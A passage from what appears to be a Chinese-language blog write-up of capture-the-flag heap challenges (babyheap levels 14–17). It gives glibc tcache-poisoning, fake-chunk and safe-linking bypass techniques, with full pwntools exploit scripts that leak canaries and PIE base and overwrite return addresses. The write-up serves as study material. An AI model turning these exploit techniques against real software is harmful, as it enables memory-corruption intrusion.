function_">stack_free</span>():</span><br><span class="line">  p.sendline(<span class="string">b&#x27;stack_free&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_scanf</span>(<span class="params">content</span>):</span><br><span class="line">  p.sendline(<span class="string">b&#x27;stack_scanf&#x27;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#1.堆栈溢出构造假堆块并释放，使之进入tcache</span></span><br><span class="line"></span><br><span class="line">usable_size = <span class="number">0x130</span></span><br><span class="line">chunk_size = ( usable_size + <span class="number">0x10</span> ) | <span class="number">1</span>     <span class="comment">#1 means previous chunk is in use</span></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(chunk_size)</span><br><span class="line">stack_scanf(buffer)</span><br><span class="line">stack_free()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.通过假堆块泄露返回地址上的值, 泄露canary</span></span><br><span class="line">canary_offset = <span class="number">0x48</span></span><br><span class="line">main_retaddr_offset = <span class="number">0x58</span></span><br><span class="line">__libc_start_main_retaddr_offset = <span class="number">0x128</span></span><br><span class="line">malloc(<span class="number">1</span>,usable_size)</span><br><span class="line">main_retaddr_value = echo(<span class="number">1</span>,main_retaddr_offset)</span><br><span class="line">__libc_start_main_retaddr_value = echo(<span class="number">1</span>,__libc_start_main_retaddr_offset)</span><br><span class="line">canary = echo(<span class="number">1</span>,canary_offset+<span class="number">1</span>,<span class="number">7</span>)</span><br><span class="line">canary = canary &lt;&lt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">start_offset = <span class="number">0x13AE</span></span><br><span class="line">win_offset = <span class="number">0x1A22</span></span><br><span class="line">pie_base = __libc_start_main_retaddr_value - start_offset</span><br><span class="line">win_addr= pie_base + win_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(main_retaddr_offset)</span></span><br><span class="line"><span class="comment"># print(__libc_start_main_retaddr_offset)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_retaddr_value))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__libc_start_main_retaddr_value))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(win_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary = &quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.在假堆块上溢出</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*canary_offset + p64(canary) </span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(main_retaddr_offset - <span class="built_in">len</span>(payload)) + p64(win_addr)</span><br><span class="line"></span><br><span class="line">scanf(<span class="number">1</span>,payload)</span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level14.1">level14.1</h3>
<p>buffer视角</p>
<table>
<thead>
<tr>
<th></th>
<th>偏移</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>buffer</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>prev_size</td>
<td>+ 0x30</td>
<td></td>
</tr>
<tr>
<td>size</td>
<td>+ 0x38</td>
<td></td>
</tr>
<tr>
<td>chunk_mem</td>
<td>+ 0x40</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x88</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_ret</td>
<td>+ 0x98</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>libc_start_main_ret</td>
<td>+ 0x168</td>
<td></td>
</tr>
</tbody>
</table>
<p>假堆块视角</p>
<table>
<thead>
<tr>
<th></th>
<th>偏移</th>
</tr>
</thead>
<tbody>
<tr>
<td>chunk_mem</td>
<td>0</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x48</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
<tr>
<td>main_ret</td>
<td>+ 0x58</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
<tr>
<td>overflow_limit</td>
<td>+ 0x7f</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
<tr>
<td>libc_start_main_ret</td>
<td>+ 0x128</td>
</tr>
</tbody>
</table>
<p>值得注意的是win函数地址的最低字节是0x9写不进去?换成0x1D就可以了?</p>
<h3 id="level15.0">level15.0</h3>
<p>只有堆块的增删改查业务</p>
<p>还是借助<code>echo</code>泄露堆栈地址,
然后在堆栈上构造假堆块,涵盖返回地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//echo</span></span><br><span class="line">  _WORD stack_var[<span class="number">7</span>]; <span class="comment">// [rsp+22h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)stack_var, <span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  argv = (<span class="type">size_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  *argv = (<span class="type">size_t</span>)<span class="string">&quot;/bin/echo&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = (<span class="type">size_t</span>)stack_var;</span><br></pre></td></tr></table></figure>
<p>每次<code>echo</code>都会有内存泄露,
<code>argv</code>这个堆块不会被释放</p>
<p><code>argv[1]</code>保存了<code>echo</code>的一个局部变量的地址,
可以利用这一点泄露堆栈地址</p>
<blockquote>
<p>然而现在不能使用<code>UAF</code>,
因为在<code>main</code>中释放堆块时会立刻将堆块指针清零,
避免了<code>UAF</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, <span class="string">&quot;free&quot;</span>) )            <span class="comment">// free</span></span><br><span class="line">...</span><br><span class="line">      <span class="built_in">free</span>(chunks[index_1]);</span><br><span class="line">      chunks[index_1] = <span class="number">0LL</span>;                  <span class="comment">// 没有UAF</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>但是<code>main</code>中<code>read</code>有堆溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, <span class="string">&quot;read&quot;</span>) )                <span class="comment">// read</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%127s&quot;</span>, input);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br><span class="line">index_3 = atoi(input);</span><br><span class="line"><span class="keyword">if</span> ( index_3 &gt; <span class="number">0xF</span> )</span><br><span class="line">  __assert_fail(<span class="string">&quot;allocation_index &lt; 16&quot;</span>, <span class="string">&quot;&lt;stdin&gt;&quot;</span>, <span class="number">0x142</span>u, <span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%127s&quot;</span>, input);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br><span class="line">sizea = atoi(input);	<span class="comment">//越界写多少完全自己决定</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] read(0, allocations[%d], %d)\n&quot;</span>, index_3, sizea);</span><br><span class="line">read(<span class="number">0</span>, chunks[index_3], sizea);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br></pre></td></tr></table></figure>
<p>综上,整个利用过程:</p>
<p>0x1.首先<code>chunk1 = malloc(0x20)</code>,拿到一个堆块,那么第一次<code>echo</code>时申请的堆块A,就紧跟在<code>chunk1</code>后面高处,这是溢出的必要条件</p>
<p>0x2.第二次<code>echo</code>,以<code>chunk1</code>为基地址,泄露堆块<code>A+0x8</code>偏移处的堆栈地址,并根据相对距离计算得到<code>main</code>函数和<code>libc_start_main</code>函数的返回地址</p>
<p>0x3.利用堆溢出造成任意地址读,根据<code>libc_start_main</code>返回到<code>start</code>中的地址,计算得到<code>pie</code>基址,根据<code>win</code>的偏移量计算得到<code>win</code>的地址</p>
<p>0x4.利用堆溢出造成的任意地址写,修改<code>main</code>函数的返回地址为<code>win</code></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./babyheap_level15.0&quot;)</span></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyheap_level15.0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">index,offset,size=<span class="number">0</span></span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    offset = <span class="built_in">str</span>(offset).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;echo&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(offset)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>):</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line">    data = <span class="built_in">int</span>.from_bytes(data,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;read&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)    </span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):				</span><br><span class="line">  malloc(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">  free(<span class="number">4</span>)</span><br><span class="line">  free(<span class="number">3</span>)</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(<span class="number">0x31</span>)+p64(addr)</span><br><span class="line">  read(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">  malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">6</span>,<span class="number">0x10</span>)</span><br><span class="line">  data = echo(<span class="number">6</span>,<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">addr,content</span>):</span><br><span class="line">  malloc(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">  free(<span class="number">4</span>)</span><br><span class="line">  free(<span class="number">3</span>)</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(<span class="number">0x31</span>)+p64(addr)</span><br><span class="line">  read(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">  malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">6</span>,<span class="number">0x10</span>)</span><br><span class="line">  read(<span class="number">6</span>,<span class="number">6</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">echo(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">data = echo(<span class="number">0</span>,<span class="number">0x38</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(data))</span><br><span class="line">stack_leak_addr = data</span><br><span class="line"></span><br><span class="line">main_ret = stack_leak_addr + <span class="number">0x176</span></span><br><span class="line">libc_start_main_ret = stack_leak_addr + <span class="number">0x246</span></span><br><span class="line"></span><br><span class="line">data = leak(libc_start_main_ret)    <span class="comment">#arbitrary read</span></span><br><span class="line">pie_base = data - <span class="number">0x142E</span></span><br><span class="line">win_addr = pie_base + <span class="number">0x1B00</span></span><br><span class="line"></span><br><span class="line">modify(main_ret,p64(win_addr))      <span class="comment">#arbitrary write</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level16.0">level16.0</h3>
<p>level16.0中使用libc-2.35,此时next指针已经被保护起来</p>
<p>利用
<code>tcache数据结构与算法/glibc-2.38/exploit/[safe-linking]*</code>的思路</p>
<p><strong>假设fake_chunk_mem已经对齐到0x10</strong></p>
<p>0x0.chunk0 = malloc(0x10)</p>
<p>0x1.chunk1 = malloc(0x10)</p>
<p>0x2.chunk2 = malloc(0x10)</p>
<p>0x3.free(chunk1)</p>
<p>0x4.free(chunk2)</p>
<p>0x5.[UAF] chunk2.next = ( 页框号 ) ^ (fake_chunk_mem)</p>
<p>0x6.chunk2 = malloc()</p>
<p>0x7.fake_chunk = malloc()</p>
<blockquote>
<p>此时fake_chunk.key归零</p>
<p>tcache-&gt;entries[idx] = REVEAL_PTR(fake_chunk.next)</p>
</blockquote>
<p>0x8.free(chunk0)</p>
<blockquote>
<p>此时chunk0.next = PROTECT_PTR(REVEAL_PTR(fake_chunk.next))</p>
</blockquote>
<p>0x9.[UAF] puts(chunk0.next)</p>
<p>0xA.计算fake_chunk.next</p>
<blockquote>
<p>fake_chunk.next = chunk0.next ^ (页框号) ^ (fake_chunk_addr &gt;&gt;
12)</p>
</blockquote>
<p>写个exp意思意思</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./babyheap_level16.0&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/babyheap_level16.0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">index, size = <span class="number">0</span></span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode() </span><br><span class="line">    p.sendline(<span class="string">b&#x27;puts&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">0</span>:</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_flag</span>(<span class="params">secret</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;send_flag&#x27;</span>)</span><br><span class="line">    p.sendline(secret)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr,size = <span class="number">0x10</span></span>):		//addr must be aligned to <span class="number">0x10</span></span><br><span class="line">    malloc(<span class="number">3</span>,size)</span><br><span class="line">    malloc(<span class="number">1</span>,size)</span><br><span class="line">    malloc(<span class="number">2</span>,size)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    chunk1_next = puts(<span class="number">1</span>)</span><br><span class="line">    chunk2_next = puts(<span class="number">2</span>)</span><br><span class="line">    chunk1_next = <span class="built_in">int</span>.from_bytes(chunk1_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    chunk2_next = <span class="built_in">int</span>.from_bytes(chunk2_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(chunk1_next))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;chunk2_next previously = &quot;</span>,<span class="built_in">hex</span>(chunk2_next))</span><br><span class="line">    chunk2_next = chunk1_next ^ addr</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;chunk2_next now = &quot;</span>,<span class="built_in">hex</span>(chunk2_next))</span><br><span class="line">    scanf(<span class="number">2</span>,p64(chunk2_next))</span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">2</span>,size)</span><br><span class="line">    malloc(<span class="number">1</span>,size)    </span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    chunk3_next = puts(<span class="number">3</span>,<span class="number">8</span>)</span><br><span class="line">    chunk3_next = <span class="built_in">int</span>.from_bytes(chunk3_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    ep = chunk1_next ^ chunk3_next</span><br><span class="line">    data = (addr &gt;&gt; <span class="number">12</span>) ^ ep</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line">secret_addr = <span class="number">0x433050</span></span><br><span class="line">malloc(<span class="number">9</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">page_num = puts(<span class="number">9</span>)</span><br><span class="line">page_num = <span class="built_in">int</span>.from_bytes(page_num, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(page_num))</span><br><span class="line"></span><br><span class="line">data = leak(secret_addr,<span class="number">0x10</span>)		//secret_addr = <span class="number">0x433050</span> <span class="keyword">is</span> aligned to <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(data))</span><br><span class="line">data = data.to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">payload = data + p64(<span class="number">0</span>) </span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">send_flag(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level17.0">level17.0</h3>
<p>ret2text</p>
<p>利用堆UAF将返回地址放到堆块上</p>
<p>调试发现返回地址都对齐到0x8</p>
<p>不满足堆块对齐到0x10的要求</p>
<p>因此假堆块可以在返回地址-0x8,-0x18等处</p>
<p>但是还有高手</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v3 = malloc_usable_size(chunks[index_2]);</span><br><span class="line"><span class="built_in">sprintf</span>(input, <span class="string">&quot;%%%us&quot;</span>, v3);</span><br><span class="line">v4 = malloc_usable_size(chunks[index_2]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] scanf(\&quot;%%%us\&quot;, allocations[%d])\n&quot;</span>, v4, index_2);</span><br><span class="line"><span class="built_in">scanf</span>(input, chunks[index_2]);</span><br></pre></td></tr></table></figure>
<p>在往假堆块写入之前,还有一个库函数<code>malloc_usable_size</code>调用,这位更是重量级,他会调用<code>musable</code></p>
<p>这位更是重中之重量级</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">musable</span><span class="params">(<span class="type">void</span> *mem)</span></span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr p = mem2chunk(mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p))</span><br><span class="line">        <span class="keyword">return</span> chunksize(p) - CHUNK_HDR_SZ;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (inuse(p))</span><br><span class="line">        <span class="keyword">return</span> memsize(p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果<code>p</code>没有<code>Mmap (2)</code>标志位,会调用<code>inuse(p)</code>这个函数会查看<strong>下一个</strong>堆块的<code>Prev_in_use (1)</code>标志位来判定<strong>当前</strong>堆块是否使用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></figure>
<p>找下一个堆块的依据是本堆块的<code>size</code>,</p>
<p>也就是说<code>p + p.size</code>就偏移到了下一个堆块</p>
<p>问题就来了,本堆块的<code>size</code>是不能确定的,本堆块是一个假堆块,很可能是一个非常大的数</p>
<p>导致<code>p+p.size</code>指向非法内存区域,导致<code>(p + p.size)-&gt;size</code>解引用失败,导致程序崩溃</p>
<p>现在考虑我们可能的受害者返回地址</p>
<p>main ret2 libc_start_main</p>
<p>libc_start_main ret2 start</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/heap-exploit/" rel="tag"># heap exploit</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/10/17/%E8%B0%83%E8%AF%95Glibc/" rel="prev" title="glibc 相关备忘">
      <i class="fa fa-chevron-left"></i> glibc 相关备忘
    </a></div>
      <div class="post-nav-item">
    <a href="/2024/11/23/%E7%9C%8B%E7%9C%8B%E4%BD%A0%E7%9A%84Bins/" rel="next" title="heap bins">
      heap bins <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
